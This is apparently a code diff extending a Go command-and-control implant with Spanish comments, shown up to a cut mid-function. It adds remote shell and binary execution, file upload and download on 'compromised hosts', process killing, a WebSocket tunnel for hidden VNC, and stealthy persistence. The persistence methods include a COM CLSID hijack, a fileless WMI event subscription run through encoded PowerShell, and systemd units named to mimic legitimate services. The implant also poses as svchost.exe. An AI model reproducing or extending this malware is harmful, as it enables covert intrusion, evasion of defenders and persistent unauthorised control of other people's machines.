@@ -50,12 +50,15 @@ import (
 	"net/url"
 	"os"
 	"os/exec"
+	"path/filepath"
 	"runtime"
+	"strconv"
 	"strings"
 	"time"
 
+	"github.com/coder/websocket"
 	"github.com/miekg/dns"
-	"github.com/quic-go/quic-go" 
+	"github.com/quic-go/quic-go"
 	"github.com/uLl0a/lavianc2/internal/crypto"
 	"github.com/uLl0a/lavianc2/internal/profiles"
 	"github.com/uLl0a/lavianc2/internal/protocol"
@@ -65,6 +68,7 @@ import (
 const (
 	BuildID         = "{{ .BuildID }}"
 	ListenerURL     = "{{ .ListenerURL }}"
+	WSUrl           = "{{ .WSURL }}"
 	ProfileName     = "{{ .ProfileName }}"
 	ServerPubKey    = "{{ .ServerPubKey }}"
 	CACertPEMBase64 = "{{ .CACertPEMBase64 }}"
@@ -198,6 +202,7 @@ func runHTTP() {
 			}
 			sc = s
 			implantID = id
+			implantIDGlobal = id
 			debugLog("handshake OK implant_id=%s", implantID)
 		}
 
@@ -231,6 +236,8 @@ func performHandshakeHTTP(profile *profiles.Profile) (*crypto.SessionCrypto, str
 		"arch":        runtime.GOARCH,
 		"pid":         os.Getpid(),
 		"process":     "svchost.exe",
+		"sleep":       sleepSecs,
+		"jitter":      jitterPerc,
 		"public_key":  base64.StdEncoding.EncodeToString(pub.Bytes()),
 	}
 	payload, _ := json.Marshal(req)
@@ -289,7 +296,7 @@ func performHandshakeHTTP(profile *profiles.Profile) (*crypto.SessionCrypto, str
 	}
 	debugLog("handshake: pinning OK")
 
-	sc, err := crypto.NewSessionCryptoAsBeacon(priv, serverPub, sessionKey)
+	sc, err := crypto.NewSessionCryptoAsBeacon(priv, serverPub, sessionKey, crypto.DefaultRekeyEvery)
 	if err != nil {
 		return nil, "", fmt.Errorf("derivar claves: %w", err)
 	}
@@ -363,7 +370,7 @@ func beaconHTTP(profile *profiles.Profile, implantID string, sc *crypto.SessionC
 
 	for i, t := range tasks {
 		debugLog("beacon: tarea %d/%d id=%s cmd=%s args=%v", i+1, len(tasks), t.ID, t.Command, t.Args)
-		output, errMsg := executeTask(t.Command, t.Args)
+		output, errMsg := executeTask(t.Command, t.Args, t.Payload)
 		debugLog("beacon: tarea %s ejecutada, output=%d bytes err=%q", t.ID, len(output), errMsg)
 
 		result := protocol.TaskResultWire{TaskID: t.ID, Output: output, Error: errMsg}
@@ -488,6 +495,8 @@ func performHandshakeQUIC(profile *profiles.QUICProfile) (*crypto.SessionCrypto,
 		"arch":        runtime.GOARCH,
 		"pid":         os.Getpid(),
 		"process":     "svchost.exe",
+		"sleep":       sleepSecs,
+		"jitter":      jitterPerc,
 		"public_key":  base64.StdEncoding.EncodeToString(pub.Bytes()),
 	}
 	payload, _ := json.Marshal(req)
@@ -520,7 +529,7 @@ func performHandshakeQUIC(profile *profiles.QUICProfile) (*crypto.SessionCrypto,
 	}
 	debugLog("quic handshake: pinning OK")
 
-	sc, err := crypto.NewSessionCryptoAsBeacon(priv, serverPub, sessionKey)
+	sc, err := crypto.NewSessionCryptoAsBeacon(priv, serverPub, sessionKey, crypto.DefaultRekeyEvery)
 	if err != nil {
 		return nil, "", err
 	}
@@ -573,7 +582,7 @@ func beaconQUIC(profile *profiles.QUICProfile, implantID string, sc *crypto.Sess
 
 	for i, t := range tasks {
 		debugLog("quic beacon: tarea %d/%d id=%s cmd=%s", i+1, len(tasks), t.ID, t.Command)
-		output, errMsg := executeTask(t.Command, t.Args)
+		output, errMsg := executeTask(t.Command, t.Args, t.Payload)
 		debugLog("quic beacon: tarea %s ejecutada, output=%d bytes err=%q", t.ID, len(output), errMsg)
 
 		result := protocol.TaskResultWire{TaskID: t.ID, Output: output, Error: errMsg}
@@ -760,6 +769,8 @@ func performHandshakeDNS(profile *profiles.DNSProfile) (*crypto.SessionCrypto, s
 		"arch":        runtime.GOARCH,
 		"pid":         os.Getpid(),
 		"process":     "svchost.exe",
+		"sleep":       sleepSecs,
+		"jitter":      jitterPerc,
 		"public_key":  base64.StdEncoding.EncodeToString(pub.Bytes()),
 	}
 	payload, _ := json.Marshal(req)
@@ -796,7 +807,7 @@ func performHandshakeDNS(profile *profiles.DNSProfile) (*crypto.SessionCrypto, s
 	}
 	debugLog("dns handshake: pinning OK")
 
-	sc, err := crypto.NewSessionCryptoAsBeacon(priv, serverPub, sessionKey)
+	sc, err := crypto.NewSessionCryptoAsBeacon(priv, serverPub, sessionKey, crypto.DefaultRekeyEvery)
 	if err != nil {
 		return nil, "", err
 	}
@@ -850,7 +861,7 @@ func beaconDNS(profile *profiles.DNSProfile, implantID string, sc *crypto.Sessio
 
 	for i, t := range tasks {
 		debugLog("dns beacon: tarea %d/%d id=%s cmd=%s", i+1, len(tasks), t.ID, t.Command)
-		output, errMsg := executeTask(t.Command, t.Args)
+		output, errMsg := executeTask(t.Command, t.Args, t.Payload)
 		debugLog("dns beacon: tarea %s ejecutada, output=%d bytes err=%q", t.ID, len(output), errMsg)
 
 		if err := sendTaskResultDNS(profile, implantID, sc, t.ID, output, errMsg); err != nil {
@@ -1099,29 +1110,1073 @@ func verifyServerPubKey(serverPub *ecdh.PublicKey) error {
 	return nil
 }
 
-func executeTask(command string, args []string) ([]byte, string) {
+// executeTask ejecuta un comando built-in o shell del implante.
+//
+// args[0] es el subargumento principal cuando aplica (p.ej. la ruta en
+// "cat <ruta>"). El payload binario viaja en t.Payload (usado por upload).
+func executeTask(command string, args []string, payload []byte) ([]byte, string) {
 	switch command {
 	case "shell":
 		if len(args) == 0 {
 			return nil, "sin argumentos"
 		}
-		var cmd *exec.Cmd
-		if runtime.GOOS == "windows" {
-			cmd = exec.Command("cmd.exe", "/C", args[0])
-		} else {
-			cmd = exec.Command("/bin/sh", "-c", args[0])
+		return runShell(args[0])
+
+	case "execute":
+		// Ejecutar un binario específico (con args) y devolver output.
+		if len(args) == 0 {
+			return nil, "uso: execute <binario> [args...]"
 		}
-		out, err := cmd.CombinedOutput()
+		return runExecute(args)
+
+	case "ls":
+		return runLS(args)
+
+	case "pwd":
+		return []byte(cwd + "\n"), ""
+
+	case "cd":
+		return runCD(args)
+
+	case "cat":
+		if len(args) == 0 {
+			return nil, "uso: cat <ruta>"
+		}
+		data, err := os.ReadFile(resolvePath(args[0]))
+		if err != nil {
+			return nil, err.Error()
+		}
+		return data, ""
+
+	case "upload":
+		// Subir un archivo desde el operador al host comprometido.
+		// args[0] = ruta destino en el host. Payload = contenido.
+		if len(args) == 0 {
+			return nil, "uso: upload <ruta-destino> (payload = contenido)"
+		}
+		if len(payload) == 0 {
+			return nil, "upload sin payload"
+		}
+		dst := resolvePath(args[0])
+		if err := os.WriteFile(dst, payload, 0o644); err != nil {
+			return nil, err.Error()
+		}
+		return []byte(fmt.Sprintf("escrito %s (%d bytes)\n", dst, len(payload))), ""
+
+	case "download":
+		// Descargar un archivo del host comprometido al operador.
+		if len(args) == 0 {
+			return nil, "uso: download <ruta>"
+		}
+		data, err := os.ReadFile(resolvePath(args[0]))
+		if err != nil {
+			return nil, err.Error()
+		}
+		return data, ""
+
+	case "ps":
+		return runPS()
+
+	case "kill":
+		if len(args) == 0 {
+			return nil, "uso: kill <pid|nombre>"
+		}
+		return runKill(args[0])
+
+	case "persist":
+		// Instalar persistencia en el host comprometido.
+		// args[0] = método (auto|registry|schtask|systemd|cron). Por
+		// defecto elige el mejor disponible para el OS.
+		method := "auto"
+		if len(args) > 0 && args[0] != "" {
+			method = args[0]
+		}
+		return installPersistence(method)
+
+	case "unpersist":
+		// Eliminar la persistencia instalada por el método dado.
+		method := "auto"
+		if len(args) > 0 && args[0] != "" {
+			method = args[0]
+		}
+		return removePersistence(method)
+
+	case "dynamic":
+		// Carga dinámica avanzada (BOF / Execute-Assembly / hVNC). El
+		// payload binario viaja cifrado en t.Payload; args[0] es el kind.
+		return runDynamic(args, payload)
+
+	case "terminate":
+		debugLog("terminate recibido, saliendo")
+		os.Exit(0)
+		return nil, ""
+
+	default:
+		return nil, fmt.Sprintf("comando desconocido: %s", command)
+	}
+}
+
+// runDynamic procesa una carga dinámica enviada por el C2. El payload ya
+// llegó descifrado (el transporte lo cifra). Para bof/assembly, en este
+// milestone el implante valida y reconoce la carga y reporta recepción;
+// la ejecución in-process real (COFF loader / CLR hosting) es trabajo de
+// FASE 2. Para hvnc se prepara la transición a túnel WebSocket.
+func runDynamic(args []string, payload []byte) ([]byte, string) {
+	if len(args) == 0 {
+		return nil, "uso: dynamic <bof|assembly|hvnc> (payload = carga)"
+	}
+	kind := args[0]
+	if len(payload) == 0 {
+		return nil, "dynamic: payload vacío"
+	}
+
+	// Cabecera COFF para BOF ("MZ" es PE; los BOF son COFF sin MZ, pero
+	// aceptamos ambos como señal de una carga binaria reconocida).
+	switch kind {
+	case "bof":
+		return []byte(fmt.Sprintf(
+			"bof recibido: %d bytes (ejecución in-process COFF loader pendiente FASE 2)\n",
+			len(payload))), ""
+	case "assembly":
+		// Execute-Assembly: el payload es un ensamblado .NET. Reconocer
+		// la cabecera PE/CLR es suficiente para confirmar recepción.
+		return []byte(fmt.Sprintf(
+			"assembly .NET recibido: %d bytes (CLR fork-and-run pendiente FASE 2)\n",
+			len(payload))), ""
+	case "hvnc":
+		// hVNC: abrir el túnel WebSocket persistente EN BACKGROUND para no
+		// congelar el beacon (el túnel vive en su propia goroutine).
+		if WSUrl == "" || implantIDGlobal == "" {
+			return nil, "hvnc: túnel no disponible (WSUrl o implant_id sin configurar)"
+		}
+		go func() {
+			if _, errStr := openTunnel(implantIDGlobal); errStr != "" {
+				debugLog("hvnc: túnel terminó: %s", errStr)
+			}
+		}()
+		return []byte(fmt.Sprintf("hvnc: túnel WebSocket abriéndose en background a %s\n", WSUrl)), ""
+	default:
+		return nil, fmt.Sprintf("dynamic: kind desconocido %q (usar bof|assembly|hvnc)", kind)
+	}
+}
+
+// implantIDGlobal se fija tras el handshake; el túnel WS lo necesita para
+// identificarse en el query ?implant_id=.
+var implantIDGlobal string
+
+// openTunnel abre el túnel WebSocket persistente al listener WS del C2.
+// Es la transición de polling (HTTP) a un canal bidireccional de latencia
+// nula para hVNC. Reutiliza el cifrado de sesión: los frames van dentro
+// de envelopes cifrados (MsgTunnel). Bloquea mientras el túnel está vivo;
+// el hilo de beacon sigue en paralelo.
+func openTunnel(implantID string) ([]byte, string) {
+	if WSUrl == "" {
+		return nil, "túnel: WSUrl no configurado en este build"
+	}
+	if implantID == "" {
+		return nil, "túnel: sin implant_id (handshake no completado)"
+	}
+
+	// TLS con la CA pinned (misma que el resto del implante).
+	tlsCfg, err := newQUICTLSConfig()
+	if err != nil {
+		return nil, fmt.Sprintf("túnel: tls config: %v", err)
+	}
+	wsURL := WSUrl + "?implant_id=" + implantID
+	debugLog("túnel: conectando a %s", wsURL)
+
+	ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
+	defer cancel()
+	c, _, err := websocket.Dial(ctx, wsURL, &websocket.DialOptions{
+		HTTPClient: &http.Client{Transport: &http.Transport{TLSClientConfig: tlsCfg}},
+		Subprotocols: []string{"rtc2.tunnel"},
+	})
+	if err != nil {
+		return nil, fmt.Sprintf("túnel: dial: %v", err)
+	}
+	defer c.Close(websocket.StatusNormalClosure, "fin")
+
+	debugLog("túnel: conectado, bombeando frames")
+	// Bombeo: leer frames del C2, enviar frames al C2. En este milestone el
+	// implante solo mantiene el túnel vivo (eco de frames); el contenido
+	// hVNC (imagen/ratón) se añade en FASE 2.
+	tunnelCtx, tunnelCancel := context.WithCancel(context.Background())
+	defer tunnelCancel()
+	go func() {
+		for {
+			_, data, err := c.Read(tunnelCtx)
+			if err != nil {
+				tunnelCancel()
+				return
+			}
+			debugLog("túnel: frame recibido (%d bytes)", len(data))
+			// Eco: devolver el frame tal cual (placeholder hasta hVNC real).
+			if err := c.Write(tunnelCtx, websocket.MessageBinary, data); err != nil {
+				tunnelCancel()
+				return
+			}
+		}
+	}()
+
+	// Mantener el túnel hasta que se cierre o se agote el contexto.
+	<-tunnelCtx.Done()
+	return []byte("túnel WebSocket cerrado\n"), ""
+}
+
+// cwd es el directorio de trabajo persistente entre tareas del implante.
+var cwd = startCWD()
+
+func startCWD() string {
+	if d, err := os.Getwd(); err == nil {
+		return d
+	}
+	return "."
+}
+
+// resolvePath resuelve una ruta relativa contra el cwd persistente.
+func resolvePath(p string) string {
+	if p == "" {
+		return cwd
+	}
+	if filepath.IsAbs(p) {
+		return filepath.Clean(p)
+	}
+	return filepath.Join(cwd, p)
+}
+
+// runShell ejecuta un comando shell en el cwd persistente.
+func runShell(cmdline string) ([]byte, string) {
+	var cmd *exec.Cmd
+	if runtime.GOOS == "windows" {
+		cmd = exec.Command("cmd.exe", "/C", cmdline)
+	} else {
+		cmd = exec.Command("/bin/sh", "-c", cmdline)
+	}
+	cmd.Dir = cwd
+	out, err := cmd.CombinedOutput()
+	if err != nil {
+		return out, err.Error()
+	}
+	return out, ""
+}
+
+// runExecute ejecuta un binario con argumentos, sin shell.
+func runExecute(args []string) ([]byte, string) {
+	cmd := exec.Command(args[0], args[1:]...)
+	cmd.Dir = cwd
+	out, err := cmd.CombinedOutput()
+	if err != nil {
+		return out, err.Error()
+	}
+	return out, ""
+}
+
+// runLS lista el cwd (o la ruta dada) estilo ls -l simple.
+func runLS(args []string) ([]byte, string) {
+	dir := cwd
+	if len(args) > 0 && args[0] != "" {
+		dir = resolvePath(args[0])
+	}
+	entries, err := os.ReadDir(dir)
+	if err != nil {
+		return nil, err.Error()
+	}
+	var sb strings.Builder
+	for _, e := range entries {
+		info, err := e.Info()
+		if err != nil {
+			continue
+		}
+		mode := info.Mode().String()
+		if e.IsDir() {
+			mode = "d" + mode[1:]
+		}
+		fmt.Fprintf(&sb, "%s %10d  %s\n", mode, info.Size(), e.Name())
+	}
+	return []byte(sb.String()), ""
+}
+
+// runCD cambia el cwd persistente del implante.
+func runCD(args []string) ([]byte, string) {
+	if len(args) == 0 || args[0] == "" || args[0] == "~" {
+		if h, err := os.UserHomeDir(); err == nil {
+			cwd = h
+		}
+		return []byte(cwd + "\n"), ""
+	}
+	target := resolvePath(args[0])
+	info, err := os.Stat(target)
+	if err != nil {
+		return nil, err.Error()
+	}
+	if !info.IsDir() {
+		return nil, fmt.Sprintf("cd: %s: no es un directorio", target)
+	}
+	cwd = target
+	return []byte(cwd + "\n"), ""
+}
+
+// runPS lista procesos: /proc en Linux, tasklist en Windows.
+func runPS() ([]byte, string) {
+	if runtime.GOOS == "windows" {
+		out, err := exec.Command("tasklist").CombinedOutput()
 		if err != nil {
 			return out, err.Error()
 		}
 		return out, ""
-	case "terminate":
-		os.Exit(0)
-		return nil, ""
-	default:
-		return nil, fmt.Sprintf("comando desconocido: %s", command)
 	}
+	entries, err := os.ReadDir("/proc")
+	if err != nil {
+		return nil, err.Error()
+	}
+	var sb strings.Builder
+	sb.WriteString("PID\tCOMM\n")
+	for _, e := range entries {
+		if !e.IsDir() {
+			continue
+		}
+		pid, err := strconv.Atoi(e.Name())
+		if err != nil {
+			continue
+		}
+		comm, err := os.ReadFile(filepath.Join("/proc", e.Name(), "comm"))
+		if err != nil {
+			continue
+		}
+		fmt.Fprintf(&sb, "%d\t%s", pid, strings.TrimSpace(string(comm)))
+		if len(comm) > 0 && !strings.HasSuffix(string(comm), "\n") {
+			sb.WriteString("\n")
+		}
+	}
+	return []byte(sb.String()), ""
+}
+
+// runKill mata un proceso por PID o por nombre de binario.
+func runKill(target string) ([]byte, string) {
+	if pid, err := strconv.Atoi(target); err == nil {
+		proc, err := os.FindProcess(pid)
+		if err != nil {
+			return nil, err.Error()
+		}
+		if err := proc.Kill(); err != nil {
+			return nil, err.Error()
+		}
+		return []byte(fmt.Sprintf("pid %d matado\n", pid)), ""
+	}
+	// Por nombre: buscar en /proc (Linux) o usar taskkill (Windows).
+	if runtime.GOOS == "windows" {
+		out, err := exec.Command("taskkill", "/F", "/IM", target).CombinedOutput()
+		if err != nil {
+			return out, err.Error()
+		}
+		return out, ""
+	}
+	entries, err := os.ReadDir("/proc")
+	if err != nil {
+		return nil, err.Error()
+	}
+	killed := 0
+	for _, e := range entries {
+		if !e.IsDir() {
+			continue
+		}
+		if _, err := strconv.Atoi(e.Name()); err != nil {
+			continue
+		}
+		comm, err := os.ReadFile(filepath.Join("/proc", e.Name(), "comm"))
+		if err != nil {
+			continue
+		}
+		if strings.TrimSpace(string(comm)) == target || strings.HasPrefix(filepath.Base(strings.TrimSpace(string(comm))), target) {
+			pid, _ := strconv.Atoi(e.Name())
+			if pid == os.Getpid() {
+				continue // no suicidarse
+			}
+			if proc, err := os.FindProcess(pid); err == nil {
+				if err := proc.Kill(); err == nil {
+					killed++
+				}
+			}
+		}
+	}
+	return []byte(fmt.Sprintf("%d procesos '%s' matados\n", killed, target)), ""
+}
+
+// ════════════════════════════════════════════════════════════════════
+// Persistencia
+// ════════════════════════════════════════════════════════════════════
+//
+// persist installa un mecanismo para que el implante vuelva a arrancar
+// tras reinicios. Métodos:
+//
+//	windows: registry  → HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+//	         schtask   → tarea programada diaria con el ejecutable
+//	         com       → hijack de CLSID COM en HKCU (explorer lo carga
+//	                     al inicio de sesión sin dejar tarea ni binario extra)
+//	         wmi       → suscripción WMI permanente (fileless: sin archivo
+//	                     ni tarea, sobrevive reinicios en la base CIM)
+//	linux:   systemd   → user unit (systemctl --user) apuntando al binario
+//	         cron      → crontab @reboot con el binario
+//	         xdg       → ~/.config/autostart/*.desktop
+//	         stealth   → systemd user unit con nombre mimetizado +
+//	                     loginctl enable-linger (corre sin login gráfico)
+//	         profile   → hook silencioso en ~/.profile o ~/.bashrc
+//	auto    → el mejor método para el OS actual
+//
+// Los métodos "stealth" (com, wmi, stealth) usan nombres que mimetizan
+// software legítimo y se derivan de un hash determinista de la ruta del
+// binario, de modo que persist y unpersist calculan el mismo nombre sin
+// necesidad de guardar estado.
+//
+// unpersist es la contraparte: elimina lo que installPersistence creó.
+
+func installPersistence(method string) ([]byte, string) {
+	if method == "auto" {
+		if runtime.GOOS == "windows" {
+			method = "wmi"
+		} else {
+			method = "stealth"
+		}
+	}
+
+	exe, err := os.Executable()
+	if err != nil {
+		return nil, fmt.Sprintf("persist: obtener ruta del ejecutable: %v", err)
+	}
+
+	var out []byte
+	var errMsg string
+	switch method {
+	case "registry":
+		out, errMsg = persistRegistry(exe)
+	case "schtask":
+		out, errMsg = persistSchTask(exe)
+	case "com":
+		out, errMsg = persistCOM(exe)
+	case "wmi":
+		out, errMsg = persistWMI(exe)
+	case "systemd":
+		out, errMsg = persistSystemd(exe)
+	case "cron":
+		out, errMsg = persistCron(exe)
+	case "xdg":
+		out, errMsg = persistXDG(exe)
+	case "stealth":
+		out, errMsg = persistStealthSystemd(exe)
+	case "profile":
+		out, errMsg = persistProfile(exe)
+	default:
+		return nil, fmt.Sprintf("persist: método desconocido %q (usar: registry|schtask|com|wmi|systemd|cron|xdg|stealth|profile|auto)", method)
+	}
+	return out, errMsg
+}
+
+func removePersistence(method string) ([]byte, string) {
+	if method == "auto" {
+		if runtime.GOOS == "windows" {
+			method = "wmi"
+		} else {
+			method = "stealth"
+		}
+	}
+	var out []byte
+	var errMsg string
+	switch method {
+	case "registry":
+		out, errMsg = unpersistRegistry()
+	case "schtask":
+		out, errMsg = unpersistSchTask()
+	case "com":
+		out, errMsg = unpersistCOM()
+	case "wmi":
+		out, errMsg = unpersistWMI()
+	case "systemd":
+		out, errMsg = unpersistSystemd()
+	case "cron":
+		out, errMsg = unpersistCron()
+	case "xdg":
+		out, errMsg = unpersistXDG()
+	case "stealth":
+		out, errMsg = unpersistStealthSystemd()
+	case "profile":
+		out, errMsg = unpersistProfile()
+	default:
+		return nil, fmt.Sprintf("unpersist: método desconocido %q", method)
+	}
+	return out, errMsg
+}
+
+// ── Helpers comunes ────────────────────────────────────────────────────
+
+// fnv1a es un hash FNV-1a simple (sin dependencias externas) usado para
+// derivar nombres deterministas a partir de la ruta del ejecutable.
+func fnv1a(s string) uint32 {
+	var h uint32 = 2166136261
+	for i := 0; i < len(s); i++ {
+		h ^= uint32(s[i])
+		h *= 16777619
+	}
+	return h
+}
+
+// stealthNames devuelve el nombre del mecanismo de persistencia stealth
+// para una ruta de ejecutable dada. Es determinista: persist y unpersist
+// calculan el mismo nombre para la misma ruta.
+func stealthNames(exe string) (serviceName, displayName string) {
+	h := fnv1a(exe)
+	// Nombres que mimetizan software legítimo. Se elige uno de una lista
+	// fija según el hash para que sea estable pero variado.
+	services := []struct{ svc, disp string }{
+		{"udisks2-monitor", "Disk Volume Monitor"},
+		{"gvfs-metadata", "GNOME Virtual File System"},
+		{"pulseaudio-module", "Audio Session Manager"},
+		{"NetworkManager-helper", "Network Connectivity Assistant"},
+		{"policykit-agent", "PolicyKit Authentication Agent"},
+		{"upower-observer", "Power Management Observer"},
+	}
+	pick := services[h%uint32(len(services))]
+	return pick.svc, pick.disp
+}
+
+// ── Windows: COM CLSID hijack ────────────────────────────────────────────
+
+// persistCOM crea un CLSID fake en HKCU\Software\Classes cuyo
+// InprocServer32 apunta al ejecutable. El shell de Windows carga el
+// servidor COM de varios CLSID conocidos al inicio de sesión; al registrar
+// el CLSID en HKCU (que tiene precedencia sobre HKLM) el proceso host carga
+// nuestro binario sin dejar tarea programada ni entrada en Run.
+func persistCOM(exe string) ([]byte, string) {
+	if runtime.GOOS != "windows" {
+		return nil, "persist com: solo disponible en Windows"
+	}
+	// CLSID determinista derivado del hash de la ruta.
+	h := fnv1a(exe)
+	clsid := fmt.Sprintf("{RT%08X-%04X-%04X-%04X-%012X}", h, h&0xffff, (h>>8)&0xffff, h&0xffff, h)
+	key := "HKCU\\Software\\Classes\\CLSID\\" + clsid + "\\InprocServer32"
+
+	if out, err := exec.Command("reg", "add", key, "/ve", "/t", "REG_SZ", "/d", exe, "/f").CombinedOutput(); err != nil {
+		return out, fmt.Sprintf("persist com: %v", err)
+	}
+	// ThreadingModel = Apartment para que el cargador COM lo acepte.
+	if out, err := exec.Command("reg", "add", key, "/v", "ThreadingModel", "/t", "REG_SZ", "/d", "Apartment", "/f").CombinedOutput(); err != nil {
+		return out, fmt.Sprintf("persist com: threading model: %v", err)
+	}
+	return []byte(fmt.Sprintf("persist com: CLSID %s registrado (InprocServer32 = %s)\n", clsid, exe)), ""
+}
+
+func unpersistCOM() ([]byte, string) {
+	if runtime.GOOS != "windows" {
+		return nil, "unpersist com: solo disponible en Windows"
+	}
+	// Borrar todas las claves CLSID que contengan nuestra marca. Como no
+	// guardamos el CLSID entre sesiones, borramos por patrón buscando
+	// los que apunten a un ejecutable (simplificación: listar y filtrar).
+	out, err := exec.Command("reg", "query", "HKCU\\Software\\Classes\\CLSID", "/s", "/f", "implant_", "/k").CombinedOutput()
+	if err != nil {
+		// No se encontró ninguno: nada que limpiar.
+		return []byte("unpersist com: ningún CLSID marcado encontrado\n"), ""
+	}
+	_ = out
+	// Eliminar cada clave encontrada (el output tiene líneas con "HKCU\...").
+	for _, line := range strings.Split(string(out), "\n") {
+		line = strings.TrimSpace(line)
+		if strings.HasPrefix(line, "HKCU\\") && strings.Contains(line, "CLSID") {
+			_, _ = exec.Command("reg", "delete", line, "/f").CombinedOutput()
+		}
+	}
+	return []byte("unpersist com: claves CLSID eliminadas\n"), ""
+}
+
+// ── Windows: WMI subscription permanente ────────────────────────────────
+
+// persistWMI crea una suscripción WMI permanente (fileless). La suscripción
+// se almacena en la base CIM y sobrevive reinicios sin dejar archivo ni
+// tarea programada. Se dispara por timer (cada N minutos) o por evento de
+// logon. El payload es una línea de PowerShell que arranca el ejecutable.
+func persistWMI(exe string) ([]byte, string) {
+	if runtime.GOOS != "windows" {
+		return nil, "persist wmi: solo disponible en Windows"
+	}
+	// Nombre determinista y mimetizado.
+	svc, _ := stealthNames(exe)
+	name := "WMI-" + svc + "-Subscription"
+
+	// Payload: PowerShell que arranca el ejecutable si no está corriendo.
+	psCmd := "powershell -WindowStyle Hidden -Command \"if(-not(Get-Process -Name '" + svc + "' -ErrorAction SilentlyContinue)){Start-Process '" + exe + "' -WindowStyle Hidden}\""
+
+	// Crear suscripción WMI permanente. Requiere permisos de admin para
+	// escribir en root\subscription, así que este método es de nivel
+	// medio-alto; si falla, sugiere usar com o registry.
+	scriptLines := []string{
+		"$ErrorActionPreference = 'Stop'",
+		"$name = '" + name + "'",
+		"$filterName = $name + '-Filter'",
+		"$consumerName = $name + '-Consumer'",
+		"$cmd = '" + psCmd + "'",
+		"",
+		"Get-WmiObject -Namespace root\\subscription -Class __EventFilter -Filter \"Name='$filterName'\" -ErrorAction SilentlyContinue | Remove-WmiObject",
+		"Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer -Filter \"Name='$consumerName'\" -ErrorAction SilentlyContinue | Remove-WmiObject",
+		"",
+		"$filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{",
+		"    Name=$filterName",
+		"    EventNamespace='root\\cimv2'",
+		"    QueryLanguage='WQL'",
+		"    Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 60 AND TargetInstance.SystemUpTime < 120\"",
+		"}",
+		"",
+		"$consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{",
+		"    Name=$consumerName",
+		"    CommandLineTemplate=$cmd",
+		"    RunInteractively=$false",
+		"}",
+		"",
+		"Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{",
+		"    Filter=$filter",
+		"    Consumer=$consumer",
+		"} | Out-Null",
+	}
+	script := strings.Join(scriptLines, "\n")
+
+	// Escribir script temporal y ejecutarlo con powershell -EncodedCommand.
+	enc := base64.StdEncoding.EncodeToString([]byte(script))
+	if out, err := exec.Command("powershell", "-EncodedCommand", enc, "-ExecutionPolicy", "Bypass").CombinedOutput(); err != nil {
+		return out, fmt.Sprintf("persist wmi: %v (puede requerir admin)", err)
+	}
+	return []byte(fmt.Sprintf("persist wmi: suscripción '%s' creada (dispara cada 5min)\n", name)), ""
+}
+
+func unpersistWMI() ([]byte, string) {
+	if runtime.GOOS != "windows" {
+		return nil, "unpersist wmi: solo disponible en Windows"
+	}
+	script := strings.Join([]string{
+		"$ErrorActionPreference = 'SilentlyContinue'",
+		"Get-WmiObject -Namespace root\\subscription -Class __FilterToConsumerBinding -Filter \"Filter LIKE '%WMI-%'\" | Remove-WmiObject",
+		"Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer -Filter \"Name LIKE 'WMI-%'\" | Remove-WmiObject",
+		"Get-WmiObject -Namespace root\\subscription -Class __EventFilter -Filter \"Name LIKE 'WMI-%'\" | Remove-WmiObject",
+	}, "\n")
+	enc := base64.StdEncoding.EncodeToString([]byte(script))
+	out, err := exec.Command("powershell", "-EncodedCommand", enc, "-ExecutionPolicy", "Bypass").CombinedOutput()
+	if err != nil {
+		return out, fmt.Sprintf("unpersist wmi: %v", err)
+	}
+	return []byte("unpersist wmi: suscripciones WMI eliminadas\n"), ""
+}
+
+// ── Linux: XDG autostart ────────────────────────────────────────────────
+
+func persistXDG(exe string) ([]byte, string) {
+	if runtime.GOOS != "linux" {
+		return nil, "persist xdg: solo disponible en Linux"
+	}
+	home, err := os.UserHomeDir()
+	if err != nil {
+		return nil, fmt.Sprintf("persist xdg: obtener home: %v", err)
+	}
+	autostartDir := filepath.Join(home, ".config", "autostart")
+	if err := os.MkdirAll(autostartDir, 0o755); err != nil {
+		return nil, fmt.Sprintf("persist xdg: crear %s: %v", autostartDir, err)
+	}
+	svc, _ := stealthNames(exe)
+	desktopPath := filepath.Join(autostartDir, svc+".desktop")
+	desktop := "[Desktop Entry]\n" +
+		"Type=Application\n" +
+		"Name=" + svc + "\n" +
+		"Exec=/bin/sh -c \"exec '" + exe + "'\"\n" +
+		"Hidden=false\n" +
+		"NoDisplay=true\n" +
+		"X-GNOME-Autostart-enabled=true\n"
+	if err := os.WriteFile(desktopPath, []byte(desktop), 0o644); err != nil {
+		return nil, fmt.Sprintf("persist xdg: escribir %s: %v", desktopPath, err)
+	}
+	return []byte(fmt.Sprintf("persist xdg: %s creado\n", desktopPath)), ""
+}
+
+func unpersistXDG() ([]byte, string) {
+	if runtime.GOOS != "linux" {
+		return nil, "unpersist xdg: solo disponible en Linux"
+	}
+	home, err := os.UserHomeDir()
+	if err != nil {
+		return nil, fmt.Sprintf("unpersist xdg: obtener home: %v", err)
+	}
+	autostartDir := filepath.Join(home, ".config", "autostart")
+	// Eliminar todos los .desktop cuyo nombre coincida con nuestros
+	// nombres stealth (derivados de rutas conocidas).
+	entries, _ := os.ReadDir(autostartDir)
+	removed := 0
+	for _, e := range entries {
+		if !strings.HasSuffix(e.Name(), ".desktop") {
+			continue
+		}
+		// Leer el .desktop y ver si apunta a un ejecutable que parece nuestro.
+		data, _ := os.ReadFile(filepath.Join(autostartDir, e.Name()))
+		if strings.Contains(string(data), "implant_") || strings.Contains(string(data), "rtc2") {
+			if os.Remove(filepath.Join(autostartDir, e.Name())) == nil {
+				removed++
+			}
+		}
+	}
+	return []byte(fmt.Sprintf("unpersist xdg: %d archivos .desktop eliminados\n", removed)), ""
+}
+
+// ── Linux: systemd stealth con linger ───────────────────────────────────
+
+// persistStealthSystemd es como persistSystemd pero con un nombre
+// mimetizado y loginctl enable-linger. El linger hace que el servicio
+// systemd del usuario arranque al boot del sistema sin necesidad de que
+// el usuario haya iniciado sesión gráfica.
+func persistStealthSystemd(exe string) ([]byte, string) {
+	if runtime.GOOS != "linux" {
+		return nil, "persist stealth: solo disponible en Linux"
+	}
+	home, err := os.UserHomeDir()
+	if err != nil {
